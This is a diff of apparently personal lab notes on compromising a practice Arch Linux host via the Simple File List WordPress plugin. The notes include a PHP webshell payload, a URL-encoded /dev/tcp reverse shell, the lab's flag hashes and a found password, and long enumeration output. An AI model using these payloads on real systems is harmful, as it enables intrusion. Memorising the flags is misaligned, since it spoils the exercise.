@@ -1,14 +1,15 @@
 **Metadata**
 
 - IP Address:  192.168.162.105
-- Hostname: 
-- OS: 	
+- Hostname: nukem
+- OS: 	Arch Linux
 - Found Credentials/Users:
+		Commander / CommanderKeenVorticons1990
 
 Main Objectives:
 
-Local.txt = 
-Proof.txt = 
+Local.txt = d68b55e10a22e02afffa69ccd158d919
+Proof.txt = 1622481b3c3aefed57c09b6ec3c5c59d
 
 **Enumeration**
 
@@ -574,7 +575,22 @@ smbclient //192.168.101.110/Backup -N
 9. Possible Exploits
 
 ```
+[+] simple-file-list
+ | Location: http://192.168.162.105/wp-content/plugins/simple-file-list/
+ | Last Updated: 2025-07-03T17:02:00.000Z
+ | Readme: http://192.168.162.105/wp-content/plugins/simple-file-list/readme.txt
+ | [!] The version is out of date, the latest version is 6.1.15
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.162.105/wp-content/plugins/simple-file-list/, status: 200
+ |
+ | Version: 4.2.2 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.162.105/wp-content/plugins/simple-file-list/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://192.168.162.105/wp-content/plugins/simple-file-list/readme.txt
 
+https://www.exploit-db.com/exploits/48449
 ```
 
 10. Other Notes
@@ -587,11 +603,38 @@ smbclient //192.168.101.110/Backup -N
 
 1. Exploit Steps
 
-```
-
-
+- After trial and error used the https://www.exploit-db.com/exploits/48449 and updated the payload data using the simple php backdoor code found in /usr/share/webshells/php/simple-backdoor.php. Everything else in exploit 48449 was left the same (you can just ignore the post and password requirements from the previous payload).
 
 ```
+def generate():
+    filename = f'{random.randint(0, 10000)}.png'
+    password = hashlib.md5(bytearray(random.getrandbits(8)
+                                     for _ in range(20))).hexdigest()
+    with open(f'{filename}', 'wb') as f:
+        payload = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'
+        f.write(payload.encode())
+    print(f'[ ] File {filename} generated with password: {password}')
+    return filename, password
+
+```
+
+- Visited http://192.168.162.105/wp-content/uploads/simple-file-list/4353.php?cmd=id to test.
+
+![[Pasted image 20260122120702.png]]
+
+- Setup listener using Penelope, url encoded reverse shell, and executed in url. 
+
+```
+penelope -p 80
+
+http://192.168.162.105/wp-content/uploads/simple-file-list/4353.php?cmd=0%3C%26196%3Bexec+196%3C%3E%2Fdev%2Ftcp%2F192.168.45.151%2F80%3B+bash+%3C%26196+%3E%26196+2%3E%26196
+```
+
+![[Pasted image 20260122121635.png]]
+
+- Received reverse shell as user http and was able to cat the local.txt file.
+
+![[Pasted image 20260122121733.png]]
 
 2. Shell Upgrade
 
@@ -618,156 +661,842 @@ reset
 1. Identify & System Info
 
 ```
-whoami
+[+] whoami
+$ whoami
+http
 
-id
+[+] id
+$ id
+uid=33(http) gid=33(http) groups=33(http)
 
-hostname
+[+] hostname
+$ hostname
+nukem
 
-pwd
+[+] pwd
+$ pwd
+/srv/http/wp-content/uploads/simple-file-list
 
-uname -a
+[+] uname -a
+$ uname -a
+Linux nukem 5.8.9-arch2-1 #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000 x86_64 GNU/Linux
 
-cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
+[+] os-release / issue
+$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
+NAME="Arch Linux"
+PRETTY_NAME="Arch Linux"
+ID=arch
+BUILD_ID=rolling
+ANSI_COLOR="38;2;23;147;209"
+HOME_URL="https://www.archlinux.org/"
+DOCUMENTATION_URL="https://wiki.archlinux.org/"
+SUPPORT_URL="https://bbs.archlinux.org/"
+BUG_REPORT_URL="https://bugs.archlinux.org/"
+LOGO=archlinux
+
 
 ```
 
 2. Environment
 
 ```
-env
+[+] env
+$ env
+SHELL=/usr/sbin/bash
+PWD=/srv/http/wp-content/uploads/simple-file-list
+_=/usr/bin/env
+LANG=en_US.UTF-8
+INVOCATION_ID=9f8408c35045400c85361a428cd85a14
+TERM=xterm-256color
+SHLVL=4
+JOURNAL_STREAM=8:15702
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
 
-set 2>/dev/null | head -n 50
+[+] set (first 50)
+$ set 2>/dev/null | head -n 50
+BASH=/usr/bin/bash
+BASHOPTS=checkwinsize:cmdhist:complete_fullquote:extquote:force_fignore:globasciiranges:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
+BASH_ALIASES=()
+BASH_ARGC=()
+BASH_ARGV=()
+BASH_CMDS=()
+BASH_EXECUTION_STRING='set 2>/dev/null | head -n 50'
+BASH_LINENO=()
+BASH_SOURCE=()
+BASH_VERSINFO=([0]="5" [1]="0" [2]="18" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
+BASH_VERSION='5.0.18(1)-release'
+DIRSTACK=()
+EUID=33
+GROUPS=()
+HOSTNAME=nukem
+HOSTTYPE=x86_64
+IFS=$' \t\n'
+INVOCATION_ID=9f8408c35045400c85361a428cd85a14
+JOURNAL_STREAM=8:15702
+LANG=en_US.UTF-8
+MACHTYPE=x86_64-pc-linux-gnu
+OPTERR=1
+OPTIND=1
+OSTYPE=linux-gnu
+PATH=/usr/local/sbin:/usr/local/bin:/usr/bin
+PPID=1176
+PS4='+ '
+PWD=/srv/http/wp-content/uploads/simple-file-list
+SHELL=/usr/sbin/bash
+SHELLOPTS=braceexpand:hashall:interactive-comments
+SHLVL=5
+TERM=xterm-256color
+UID=33
+_=/usr/bin/bash
 
-echo "$PATH"
+[+] PATH
+$ echo "$PATH"
+/usr/local/sbin:/usr/local/bin:/usr/bin
 
-echo "HOME=$HOME"; echo "SHELL=$SHELL"
+[+] HOME and SHELL
+$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
+HOME=
+SHELL=/usr/sbin/bash
+
+
 
 ```
 
 3. User & Home Directories
 
 ```
-cat /etc/passwd
+[+] /etc/passwd
+$ cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+bin:x:1:1::/:/usr/bin/nologin
+daemon:x:2:2::/:/usr/bin/nologin
+mail:x:8:12::/var/spool/mail:/usr/bin/nologin
+ftp:x:14:11::/srv/ftp:/usr/bin/nologin
+http:x:33:33::/srv/http:/usr/bin/nologin
+nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
+dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
+systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
+systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
+systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
+systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
+systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
+uuidd:x:68:68::/:/usr/bin/nologin
+mysql:x:977:977:MariaDB:/var/lib/mysql:/usr/bin/nologin
+commander:x:1000:1000::/home/commander:/bin/bash
+avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
+colord:x:975:975:Color management daemon:/var/lib/colord:/usr/bin/nologin
+lightdm:x:974:974:Light Display Manager:/var/lib/lightdm:/usr/bin/nologin
+polkitd:x:102:102:PolicyKit daemon:/:/usr/bin/nologin
+usbmux:x:140:140:usbmux user:/:/usr/bin/nologin
+git:x:973:973:git daemon user:/:/usr/bin/git-shell
 
-ls -la /home
+[+] home directories
+$ ls -la /home
+total 12
+drwxr-xr-x  3 root      root      4096 Sep 18  2020 .
+drwxr-xr-x 17 root      root      4096 Sep 18  2020 ..
+drwxr-xr-x 10 commander commander 4096 Mar  4  2025 commander
 
-ls -la /root 2>/dev/null
+[+] root home (if accessible)
+$ ls -la /root 2>/dev/null
 
-sudo -l 2>/dev/null
+[+] sudo -l
+$ sudo -l 2>/dev/null
 
-sudo -V 2>/dev/null | head -n 10
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for http: 
+Sorry, try again.
+[sudo] password for http: 
+Sorry, try again.
+[sudo] password for http: 
+
+[+] sudo -V (first 10)
+$ sudo -V 2>/dev/null | head -n 10
+Sudo version 1.9.3p1
+Sudoers policy plugin version 1.9.3p1
+Sudoers file grammar version 48
+Sudoers I/O plugin version 1.9.3p1
+Sudoers audit plugin version 1.9.3p1
+
 ```
 
 4. Writable Paths & Permissions
 
 ```
-find / -writable -type d 2>/dev/null | head -n 50
+[+] world-writable directories (first 50)
+$ find / -writable -type d 2>/dev/null | head -n 50
+/tmp
+/var/lib/nginx/uwsgi
+/var/lib/nginx/scgi
+/var/lib/nginx/fastcgi
+/var/lib/nginx/proxy
+/var/lib/nginx/client-body
+/var/tmp
+/var/spool/mail
+/var/spool/samba
+/proc/1206/task/1206/fd
+/proc/1206/fd
+/proc/1206/map_files
+/srv/http
+/srv/http/wp-content
+/srv/http/wp-content/uploads
+/srv/http/wp-content/uploads/2026
+/srv/http/wp-content/uploads/2026/01
+/srv/http/wp-content/uploads/simple-file-list
+/srv/http/wp-content/uploads/2020
+/srv/http/wp-content/uploads/2020/09
+/srv/http/wp-content/uploads/2020/10
+/srv/http/wp-content/plugins
+/srv/http/wp-content/plugins/akismet
+/srv/http/wp-content/plugins/akismet/views
+/srv/http/wp-content/plugins/akismet/_inc
+/srv/http/wp-content/plugins/akismet/_inc/img
+/srv/http/wp-content/themes
+/srv/http/wp-content/themes/twentynineteen
+/srv/http/wp-content/themes/twentynineteen/sass
+/srv/http/wp-content/themes/twentynineteen/sass/modules
+/srv/http/wp-content/themes/twentynineteen/sass/navigation
+/srv/http/wp-content/themes/twentynineteen/sass/forms
+/srv/http/wp-content/themes/twentynineteen/sass/layout
+/srv/http/wp-content/themes/twentynineteen/sass/typography
+/srv/http/wp-content/themes/twentynineteen/sass/blocks
+/srv/http/wp-content/themes/twentynineteen/sass/mixins
+/srv/http/wp-content/themes/twentynineteen/sass/media
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site
+/srv/http/wp-content/themes/twentynineteen/sass/elements
+/srv/http/wp-content/themes/twentynineteen/sass/site
+/srv/http/wp-content/themes/twentynineteen/sass/site/secondary
+/srv/http/wp-content/themes/twentynineteen/sass/site/header
+/srv/http/wp-content/themes/twentynineteen/sass/site/primary
+/srv/http/wp-content/themes/twentynineteen/sass/site/footer
+/srv/http/wp-content/themes/twentynineteen/inc
+/srv/http/wp-content/themes/twentynineteen/fonts
+/srv/http/wp-content/themes/twentynineteen/js
+/srv/http/wp-content/themes/twentynineteen/template-parts
+/srv/http/wp-content/themes/twentynineteen/template-parts/post
+/srv/http/wp-content/themes/twentynineteen/template-parts/header
 
-find / -writable -type f 2>/dev/null | head -n 50
+[+] world-writable files (first 50)
+$ find / -writable -type f 2>/dev/null | head -n 50
+/sys/fs/cgroup/memory/user.slice/user-974.slice/session-c1.scope/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-974.slice/user@974.service/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-974.slice/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/user@1000.service/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-1.scope/cgroup.event_control
+/sys/fs/cgroup/memory/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/nginx.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/mariadb.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-modprobe.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/lightdm.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-vncserver.slice/vncserver@:1.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-vncserver.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sshd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/tmp.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/boot-efi.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/vmtoolsd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-kernel-tracing.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/pythonflask.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/httpd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/smb.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/upower.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/proc/sys/kernel/ns_last_pid
+/proc/1/task/1/attr/current
+/proc/1/task/1/attr/exec
+/proc/1/task/1/attr/fscreate
+/proc/1/task/1/attr/keycreate
+/proc/1/task/1/attr/sockcreate
+/proc/1/task/1/attr/smack/current
+/proc/1/task/1/attr/apparmor/current
+/proc/1/task/1/attr/apparmor/exec
+/proc/1/attr/current
+/proc/1/attr/exec
+/proc/1/attr/fscreate
+/proc/1/attr/keycreate
+/proc/1/attr/sockcreate
 
-echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
+[+] PATH entries + writable check
+$ echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
+OK: /usr/local/sbin
+OK: /usr/local/bin
+OK: /usr/bin
 
-find / -user "$(id -un)" -type f 2>/dev/null | head -n 50
+[+] files owned by current user (first 50)
+$ find / -user "http" -type f 2>/dev/null | head -n 50
+/proc/556/task/556/fdinfo/0
+/proc/556/task/556/fdinfo/1
+/proc/556/task/556/fdinfo/2
+/proc/556/task/556/fdinfo/3
+/proc/556/task/556/fdinfo/4
+/proc/556/task/556/fdinfo/6
+/proc/556/task/556/fdinfo/7
+/proc/556/task/556/fdinfo/8
+/proc/556/task/556/fdinfo/9
+/proc/556/task/556/environ
+/proc/556/task/556/auxv
+/proc/556/task/556/status
+/proc/556/task/556/personality
+/proc/556/task/556/limits
+/proc/556/task/556/sched
+/proc/556/task/556/comm
+/proc/556/task/556/syscall
+/proc/556/task/556/cmdline
+/proc/556/task/556/stat
+/proc/556/task/556/statm
+/proc/556/task/556/maps
+/proc/556/task/556/children
+/proc/556/task/556/numa_maps
+/proc/556/task/556/mem
+/proc/556/task/556/mounts
+/proc/556/task/556/mountinfo
+/proc/556/task/556/clear_refs
+/proc/556/task/556/smaps
+/proc/556/task/556/smaps_rollup
+/proc/556/task/556/pagemap
+/proc/556/task/556/attr/current
+/proc/556/task/556/attr/prev
+/proc/556/task/556/attr/exec
+/proc/556/task/556/attr/fscreate
+/proc/556/task/556/attr/keycreate
+/proc/556/task/556/attr/sockcreate
+/proc/556/task/556/attr/smack/current
+/proc/556/task/556/attr/apparmor/current
+/proc/556/task/556/attr/apparmor/prev
+/proc/556/task/556/attr/apparmor/exec
+/proc/556/task/556/wchan
+/proc/556/task/556/stack
+/proc/556/task/556/schedstat
+/proc/556/task/556/latency
+/proc/556/task/556/cpuset
+/proc/556/task/556/cgroup
+/proc/556/task/556/cpu_resctrl_groups
+/proc/556/task/556/oom_score
+/proc/556/task/556/oom_adj
+/proc/556/task/556/oom_score_adj
 
-ls -l /etc/passwd 2>/dev/null
+[+] /etc/passwd perms
+$ ls -l /etc/passwd 2>/dev/null
+-rw-r--r-- 1 root root 1165 Oct 14  2020 /etc/passwd
 
-ls -l /etc/shadow 2>/dev/null
+[+] /etc/shadow perms
+$ ls -l /etc/shadow 2>/dev/null
+-rw------- 1 root root 738 Oct 14  2020 /etc/shadow
 
-ls -la / 2>/dev/null
+[+] root dir perms
+$ ls -la / 2>/dev/null
+total 64
+drwxr-xr-x  17 root root  4096 Sep 18  2020 .
+drwxr-xr-x  17 root root  4096 Sep 18  2020 ..
+lrwxrwxrwx   1 root root     7 Aug 21  2020 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Sep 18  2020 boot
+-rwxr-xr-x   1 root root   877 Sep 18  2020 build_arch.sh
+drwxr-xr-x  18 root root  3160 Mar  4  2025 dev
+drwxr-xr-x  59 root root  4096 Oct 14  2020 etc
+drwxr-xr-x   3 root root  4096 Sep 18  2020 home
+lrwxrwxrwx   1 root root     7 Aug 21  2020 lib -> usr/lib
+lrwxrwxrwx   1 root root     7 Aug 21  2020 lib64 -> usr/lib
+drwx------   2 root root 16384 Sep 18  2020 lost+found
+drwxr-xr-x   2 root root  4096 Aug 21  2020 mnt
+drwxr-xr-x   2 root root  4096 Aug 21  2020 opt
+dr-xr-xr-x 237 root root     0 Mar  4  2025 proc
+drwxr-x---   5 root root  4096 Jan 22 17:44 root
+drwxr-xr-x  18 root root   540 Mar  4  2025 run
+lrwxrwxrwx   1 root root     7 Aug 21  2020 sbin -> usr/bin
+drwxr-xr-x   4 root root  4096 Sep 18  2020 srv
+dr-xr-xr-x  13 root root     0 Mar  4  2025 sys
+drwxrwxrwt   2 root root    40 Jan 22 20:12 tmp
+drwxr-xr-x   8 root root  4096 Sep 30  2020 usr
+drwxr-xr-x  12 root root  4096 Oct 14  2020 var
+
 
 ```
 
 4. SUID / SGID / Capabilities
 
 ```
-find / -perm -4000 -type f 2>/dev/null
+[+] SUID binaries
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/ssh/ssh-keysign
+/usr/lib/Xorg.wrap
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/bin/fusermount
+/usr/bin/su
+/usr/bin/ksu
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/expiry
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/chage
+/usr/bin/dosbox
+/usr/bin/newgrp
+/usr/bin/mount.cifs
+/usr/bin/suexec
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/sg
+/usr/bin/unix_chkpwd
 
-find / -perm -2000 -type f 2>/dev/null
+[+] SGID binaries
+$ find / -perm -2000 -type f 2>/dev/null
+/usr/bin/wall
+/usr/bin/mount.cifs
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/write
+/usr/bin/unix_chkpwd
 
-getcap -r / 2>/dev/null
+[+] setcap
+$ getcap -r / 2>/dev/null
+/usr/bin/rlogin cap_net_bind_service=ep
+/usr/bin/rsh cap_net_bind_service=ep
+/usr/bin/newgidmap cap_setgid=ep
+/usr/bin/rcp cap_net_bind_service=ep
+/usr/bin/newuidmap cap_setuid=ep
+
 
 ```
 
 5. Cron & Scheduled Tasks
 
 ```
-cat /etc/crontab 2>/dev/null
+[+] /etc/crontab
+$ cat /etc/crontab 2>/dev/null
 
-ls -la /etc/cron.* 2>/dev/null
+[+] /etc/cron.*
+$ ls -la /etc/cron.* 2>/dev/null
 
-crontab -l 2>/dev/null
+[+] user crontab
+$ crontab -l 2>/dev/null
+
 ```
 
 6. Processes & Network
 
 ```
-ps aux
 
-ps -ef
+[+] ps aux
+$ ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.5  28288 11468 ?        Ss   17:33   0:00 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    17:33   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   17:33   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   17:33   0:00 [rcu_par_gp]
+root           6  0.0  0.0      0     0 ?        I<   17:33   0:00 [kworker/0:0H-kblockd]
+root           7  0.0  0.0      0     0 ?        I    17:33   0:00 [kworker/u2:0-events_power_efficient]
+root           8  0.0  0.0      0     0 ?        I<   17:33   0:00 [mm_percpu_wq]
+root           9  0.0  0.0      0     0 ?        S    17:33   0:00 [ksoftirqd/0]
+root          10  0.0  0.0      0     0 ?        S    17:33   0:00 [rcuc/0]
+root          11  0.0  0.0      0     0 ?        I    17:33   0:00 [rcu_preempt]
+root          12  0.0  0.0      0     0 ?        S    17:33   0:00 [rcub/0]
+root          13  0.0  0.0      0     0 ?        S    17:33   0:00 [migration/0]
+root          14  0.0  0.0      0     0 ?        S    17:33   0:00 [idle_inject/0]
+root          16  0.0  0.0      0     0 ?        S    17:33   0:00 [cpuhp/0]
+root          17  0.0  0.0      0     0 ?        S    17:33   0:00 [kdevtmpfs]
+root          18  0.0  0.0      0     0 ?        I<   17:33   0:00 [netns]
+root          19  0.0  0.0      0     0 ?        S    17:33   0:00 [rcu_tasks_kthre]
+root          20  0.0  0.0      0     0 ?        S    17:33   0:00 [rcu_tasks_rude_]
+root          21  0.0  0.0      0     0 ?        S    17:33   0:00 [kauditd]
+root          22  0.0  0.0      0     0 ?        S    17:33   0:00 [khungtaskd]
+root          23  0.0  0.0      0     0 ?        S    17:33   0:00 [oom_reaper]
+root          24  0.0  0.0      0     0 ?        I<   17:33   0:00 [writeback]
+root          25  0.0  0.0      0     0 ?        S    17:33   0:00 [kcompactd0]
+root          26  0.0  0.0      0     0 ?        SN   17:33   0:00 [ksmd]
+root          27  0.0  0.0      0     0 ?        SN   17:33   0:00 [khugepaged]
+root          69  0.0  0.0      0     0 ?        I<   17:33   0:00 [kintegrityd]
+root          70  0.0  0.0      0     0 ?        I<   17:33   0:00 [kblockd]
+root          71  0.0  0.0      0     0 ?        I<   17:33   0:00 [blkcg_punt_bio]
+root          72  0.0  0.0      0     0 ?        I<   17:33   0:00 [ata_sff]
+root          73  0.0  0.0      0     0 ?        I<   17:33   0:00 [edac-poller]
+root          74  0.0  0.0      0     0 ?        I<   17:33   0:00 [devfreq_wq]
+root          75  0.0  0.0      0     0 ?        S    17:33   0:00 [watchdogd]
+root          77  0.0  0.0      0     0 ?        I<   17:33   0:00 [pm_wq]
+root          78  0.0  0.0      0     0 ?        S    17:33   0:00 [kswapd0]
+root          80  0.0  0.0      0     0 ?        I<   17:33   0:00 [kthrotld]
+root          81  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/24-pciehp]
+root          82  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/25-pciehp]
+root          83  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/26-pciehp]
+root          84  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/27-pciehp]
+root          85  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/28-pciehp]
+root          86  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/29-pciehp]
+root          87  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/30-pciehp]
+root          88  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/31-pciehp]
+root          89  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/32-pciehp]
+root          90  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/33-pciehp]
+root          91  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/34-pciehp]
+root          92  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/35-pciehp]
+root          93  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/36-pciehp]
+root          94  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/37-pciehp]
+root          95  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/38-pciehp]
+root          96  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/39-pciehp]
+root          97  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/40-pciehp]
+root          98  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/41-pciehp]
+root          99  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/42-pciehp]
+root         100  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/43-pciehp]
+root         101  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/44-pciehp]
+root         102  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/45-pciehp]
+root         103  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/46-pciehp]
+root         104  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/47-pciehp]
+root         105  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/48-pciehp]
+root         106  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/49-pciehp]
+root         107  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/50-pciehp]
+root         108  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/51-pciehp]
+root         109  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/52-pciehp]
+root         110  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/53-pciehp]
+root         111  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/54-pciehp]
+root         112  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/55-pciehp]
+root         113  0.0  0.0      0     0 ?        I<   17:33   0:00 [acpi_thermal_pm]
+root         114  0.0  0.0      0     0 ?        I<   17:33   0:00 [nvme-wq]
+root         115  0.0  0.0      0     0 ?        I<   17:33   0:00 [nvme-reset-wq]
+root         116  0.0  0.0      0     0 ?        I<   17:33   0:00 [nvme-delete-wq]
+root         117  0.0  0.0      0     0 ?        I<   17:33   0:00 [ipv6_addrconf]
+root         126  0.0  0.0      0     0 ?        I<   17:33   0:00 [kstrp]
+root         131  0.0  0.0      0     0 ?        I<   17:33   0:00 [zswap1]
+root         132  0.0  0.0      0     0 ?        I<   17:33   0:00 [zswap1]
+root         133  0.0  0.0      0     0 ?        I<   17:33   0:00 [zswap-shrink]
+root         134  0.0  0.0      0     0 ?        I<   17:33   0:00 [kworker/u3:0]
+root         135  0.0  0.0      0     0 ?        I<   17:33   0:00 [charger_manager]
+root         163  0.0  0.0      0     0 ?        I    17:33   0:00 [kworker/0:2-events]
+root         165  0.0  0.0      0     0 ?        S    17:33   0:00 [scsi_eh_0]
+root         166  0.0  0.0      0     0 ?        S    17:33   0:00 [scsi_eh_1]
+root         167  0.0  0.0      0     0 ?        I<   17:33   0:00 [scsi_tmf_0]
+root         168  0.0  0.0      0     0 ?        I<   17:33   0:00 [scsi_tmf_1]
+root         169  0.0  0.0      0     0 ?        S    17:33   0:00 [scsi_eh_2]
+root         170  0.0  0.0      0     0 ?        I<   17:33   0:00 [vmw_pvscsi_wq_1]
+root         171  0.0  0.0      0     0 ?        I<   17:33   0:00 [scsi_tmf_2]
+root         172  0.0  0.0      0     0 ?        I    17:33   0:00 [kworker/u2:2-events_unbound]
+root         174  0.0  0.0      0     0 ?        I<   17:33   0:00 [kworker/0:1H-kblockd]
+root         187  0.0  0.0      0     0 ?        S    17:33   0:00 [jbd2/sda2-8]
+root         188  0.0  0.0      0     0 ?        I<   17:33   0:00 [ext4-rsv-conver]
+root         214  0.0  0.9  71840 20076 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd-journald
+root         223  0.0  0.4  33284  9528 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd-udevd
+root         246  0.0  0.0      0     0 ?        I<   17:33   0:00 [cryptd]
+dbus         282  0.0  0.2   7420  4444 ?        Ss   17:33   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         284  0.0  0.4  19040  9008 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd-logind
+root         285  0.0  0.3 160064  7504 ?        Ssl  17:33   0:04 /usr/bin/vmtoolsd
+root         295  0.0  0.0      0     0 ?        S    17:33   0:00 [irq/16-vmwgfx]
+root         296  0.0  0.0      0     0 ?        I<   17:33   0:00 [ttm_swap]
+root         348  0.0  1.1  74076 22368 ?        Ss   17:33   0:00 /usr/bin/httpd -k start -DFOREGROUND
+root         350  0.0  0.2   8784  5668 ?        Ss   17:33   0:00 sshd: /usr/bin/sshd -D [listener] 0 of 10-100 startups
+root         356  0.0  0.3 231300  6932 ?        Ssl  17:33   0:00 /usr/bin/lightdm
+root         365  0.0  0.1   5888  3260 ?        Ss   17:33   0:00 /usr/bin/vncsession commander :1
+root         366  0.0  0.0      0     0 ?        Z    17:33   0:00 [vncsession] <defunct>
+root         376  0.0  2.7 183940 56464 tty7     Ss+  17:33   0:00 /usr/lib/Xorg :0 -seat seat0 -auth /run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+command+     377  0.0  0.5  20472 10316 ?        Ss   17:33   0:00 /usr/lib/systemd/systemd --user
+mysql        382  0.0  4.2 631092 86108 ?        Ssl  17:33   0:01 /usr/bin/mariadbd
+command+     383  0.0  0.1  31924  2840 ?        S    17:33   0:00 (sd-pam)
